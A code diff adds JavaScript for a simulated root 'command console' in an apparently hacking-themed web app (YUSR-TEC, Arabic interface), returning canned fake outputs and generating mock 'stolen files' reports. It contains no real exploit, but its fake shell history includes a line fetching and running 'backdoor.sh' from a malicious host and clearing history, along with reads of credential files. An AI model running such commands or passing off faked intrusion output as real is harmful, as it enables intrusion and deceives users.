@@ -1590,6 +1590,261 @@ window.addEventListener('beforeunload', function() {
     }
 });
 
+// Command Console Functions
+function showCommandConsole() {
+    document.getElementById('commandConsole').style.display = 'block';
+    document.getElementById('commandInput').focus();
+}
+
+function handleCommandInput(event) {
+    if (event.key === 'Enter') {
+        executeCommand();
+    }
+}
+
+function executeCommand() {
+    const input = document.getElementById('commandInput');
+    const command = input.value.trim();
+    
+    if (!command) return;
+    
+    const output = document.getElementById('commandOutput');
+    const timestamp = new Date().toLocaleTimeString('ar-SA');
+    
+    // Add command to output
+    output.textContent += `\n[${timestamp}] root@victim:~# ${command}\n`;
+    
+    // Simulate command execution
+    const result = simulateCommand(command);
+    output.textContent += result + '\n';
+    
+    // Clear input
+    input.value = '';
+    
+    // Scroll to bottom
+    output.scrollTop = output.scrollHeight;
+    
+    // Log the command execution
+    logVictimAction(`Command executed: ${command}`);
+}
+
+function quickCommand(command) {
+    document.getElementById('commandInput').value = command;
+    executeCommand();
+}
+
+function simulateCommand(command) {
+    const lowerCmd = command.toLowerCase();
+    
+    if (lowerCmd.includes('whoami')) {
+        return 'root';
+    } else if (lowerCmd.includes('pwd')) {
+        return '/root';
+    } else if (lowerCmd.includes('ls')) {
+        return `total 24
+drwxr-xr-x 6 root root 4096 Jan 12 15:30 .
+drwxr-xr-x 3 root root 4096 Jan 12 15:28 ..
+-rw------- 1 root root  123 Jan 12 15:30 .bash_history
+-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
+drwx------ 2 root root 4096 Jan 12 15:28 .cache
+-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
+drwxr-xr-x 2 root root 4096 Jan 12 15:30 Desktop
+drwxr-xr-x 2 root root 4096 Jan 12 15:30 Documents
+-rw-r--r-- 1 root root  456 Jan 12 15:29 passwords.txt
+-rw-r--r-- 1 root root 1234 Jan 12 15:29 sensitive_data.db`;
+    } else if (lowerCmd.includes('netstat')) {
+        return `Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
+tcp        0      0 192.168.1.100:22        192.168.1.50:34567      ESTABLISHED`;
+    } else if (lowerCmd.includes('ps aux')) {
+        return `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1  225676  4936 ?        Ss   15:28   0:01 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    15:28   0:00 [kthreadd]
+root      1234  0.5  2.1 1234567 87654 ?        S    15:29   0:05 /usr/bin/backdoor_service
+www-data  5678  0.2  1.5  456789 45678 ?        S    15:30   0:02 /usr/sbin/apache2
+mysql     9876  1.2  5.4 2345678 234567 ?      Sl   15:28   0:12 /usr/sbin/mysqld`;
+    } else if (lowerCmd.includes('cat /etc/passwd')) {
+        return `root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mysql:x:999:999:MySQL Server:/nonexistent:/bin/false
+admin:x:1000:1000:Administrator:/home/admin:/bin/bash`;
+    } else if (lowerCmd.includes('id')) {
+        return 'uid=0(root) gid=0(root) groups=0(root)';
+    } else if (lowerCmd.includes('uname')) {
+        return 'Linux victim-server 5.4.0-74-generic #83-Ubuntu SMP x86_64 GNU/Linux';
+    } else if (lowerCmd.includes('ifconfig') || lowerCmd.includes('ip addr')) {
+        return `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:4e:66:a1  txqueuelen 1000  (Ethernet)`;
+    } else if (lowerCmd.includes('cat') && lowerCmd.includes('passwords')) {
+        return `admin:SecretPass123!
+root:RootPassword456
+database_user:DbPass789
+backup_service:BackupKey321`;
+    } else if (lowerCmd.includes('find') && lowerCmd.includes('name')) {
+        return `/home/admin/important_docs/financial_reports.xlsx
+/var/www/html/admin/config.php
+/root/.ssh/id_rsa
+/etc/shadow
+/var/backups/database_dump.sql`;
+    } else if (lowerCmd.includes('crontab')) {
+        return `# m h  dom mon dow   command
+0 2 * * * /usr/bin/backup_script.sh
+*/5 * * * * /usr/bin/keylogger >> /tmp/.keys
+30 1 * * * /usr/bin/data_exfil.py`;
+    } else if (lowerCmd.startsWith('cd ')) {
+        return `Changed directory to: ${command.substring(3)}`;
+    } else if (lowerCmd.includes('history')) {
+        return `1  sudo su
+2  cat /etc/passwd
+3  nano /etc/hosts
+4  mysql -u root -p
+5  wget http://malicious-site.com/backdoor.sh
+6  chmod +x backdoor.sh
+7  ./backdoor.sh
+8  rm backdoor.sh
+9  history -c`;
+    } else {
+        return `Command executed: ${command}
+Exit code: 0
+Output: Command completed successfully.`;
+    }
+}
+
+function clearConsole() {
+    document.getElementById('commandOutput').textContent = 'جاهز لتنفيذ الأوامر...';
+}
+
+function saveConsoleLog() {
+    const output = document.getElementById('commandOutput').textContent;
+    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+    
+    const content = `
+YUSR-TEC - سجل وحدة التحكم
+========================
+
+الهدف: ${selectedTarget ? selectedTarget.address : 'غير محدد'}
+التاريخ: ${new Date().toLocaleString('ar-SA')}
+المشغل: root@victim
+
+سجل الأوامر:
+============
+${output}
+
+إحصائيات الجلسة:
+================
+- عدد الأوامر المنفذة: ${(output.match(/root@victim:~#/g) || []).length}
+- مدة الجلسة: ${Math.floor(Math.random() * 30) + 5} دقيقة
+- مستوى الوصول: root (مدير النظام)
+- حالة الاتصال: مشفر ومخفي
+
+⚠️ تحذير: هذا السجل يحتوي على أوامر حساسة
+`;
+
+    const blob = new Blob([content], { type: 'text/plain; charset=utf-8' });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = `console_log_${timestamp}.txt`;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    URL.revokeObjectURL(url);
+    
+    alert('💾 تم حفظ سجل وحدة التحكم بنجاح');
+}
+
+function uploadFile() {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.onchange = function(event) {
+        const file = event.target.files[0];
+        if (file) {
+            const output = document.getElementById('commandOutput');
+            const timestamp = new Date().toLocaleTimeString('ar-SA');
+            output.textContent += `\n[${timestamp}] Uploading file: ${file.name} (${file.size} bytes)\n`;
+            output.textContent += `File uploaded successfully to /tmp/${file.name}\n`;
+            output.scrollTop = output.scrollHeight;
+            
+            logVictimAction(`File uploaded: ${file.name}`);
+        }
+    };
+    input.click();
+}
+
+function downloadFiles() {
+    const files = [
+        '/etc/passwd',
+        '/etc/shadow',
+        '/root/.ssh/id_rsa',
+        '/home/admin/passwords.txt',
+        '/var/www/html/config.php',
+        '/var/backups/database_dump.sql'
+    ];
+    
+    const selectedFiles = files.filter(() => Math.random() > 0.3);
+    
+    if (selectedFiles.length === 0) {
+        alert('❌ لا توجد ملفات متاحة للتحميل');
+        return;
+    }
+    
+    const content = `
+YUSR-TEC - ملفات مسروقة من النظام
+================================
+
+الهدف: ${selectedTarget ? selectedTarget.address : 'غير محدد'}
+التاريخ: ${new Date().toLocaleString('ar-SA')}
+
+الملفات المسروقة:
+================
+${selectedFiles.map((file, index) => `${index + 1}. ${file}`).join('\n')}
+
+تفاصيل السرقة:
+==============
+- طريقة الوصول: SSH Shell Access
+- الصلاحيات: root
+- حالة التشفير: مشفر AES-256
+- حالة الإخفاء: مخفي عن أنظمة المراقبة
+
+محتوى نموذجي:
+=============
+[/etc/passwd]
+root:x:0:0:root:/root:/bin/bash
+admin:x:1000:1000:Administrator:/home/admin:/bin/bash
+
+[passwords.txt]
+admin:SecretPass123!
+root:RootPassword456
+database_user:DbPass789
+
+⚠️ تحذير: هذه الملفات سرية ومسروقة
+`;
+
+    const blob = new Blob([content], { type: 'text/plain; charset=utf-8' });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = `stolen_files_${Date.now()}.txt`;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    URL.revokeObjectURL(url);
+    
+    alert(`📥 تم تحميل ${selectedFiles.length} ملف من النظام المخترق`);
+}
+
 // Function to view target details from visual targets
 function viewTargetDetails(targetAddress) {
     // Find the target in the visualTargets array
